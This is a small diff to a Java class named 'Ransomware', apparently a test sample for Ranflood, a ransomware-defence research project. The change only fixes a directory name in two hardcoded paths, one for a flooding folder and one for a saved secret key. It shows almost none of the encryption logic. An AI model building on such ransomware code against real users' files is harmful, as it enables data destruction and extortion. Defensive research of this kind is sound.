@@ -27,7 +27,7 @@ import javax.crypto.*;
 
 public class Ransomware {
 
-	private static final String floodingPath = "/home/studente/Desktop/RanFlood/Flooding";
+	private static final String floodingPath = "/home/studente/Desktop/Ranflood/Flooding";
 	private static final long bigFileDimension = 50000000;
 	private static final int BUFFER_SIZE = 4096; // 4KB
 
@@ -60,7 +60,7 @@ public class Ransomware {
 
 		//Save secretKey
 		try {
-			File file = new File( "/home/studente/Desktop/RanFlood/secretKey.txt" );
+			File file = new File( "/home/studente/Desktop/Ranflood/secretKey.txt" );
 			FileWriter fw = new FileWriter( file );
 			fw.write( encodedKey );
 			fw.close();
